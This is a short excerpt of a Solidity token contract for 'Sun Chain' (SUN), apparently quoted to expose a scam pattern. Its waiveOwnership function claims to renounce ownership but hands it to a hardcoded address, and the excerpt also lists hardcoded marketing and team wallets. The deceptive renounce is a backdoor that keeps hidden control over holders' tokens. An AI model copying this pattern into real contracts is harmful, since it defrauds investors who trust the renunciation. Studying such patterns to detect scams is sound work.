...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x79bee75a92f49FCd72b3f8E3d871327A808ff1dD);
    }
...
contract SunChain is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Sun Chain";
    string private _symbol = "SUN";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xF88375546c24931F0157b303D0be8E0fecCF4613);
    address payable public teamWalletAddress = payable(0x4f3C37977fD1A9C4aC5C45F429fb292EB10B2b2A);
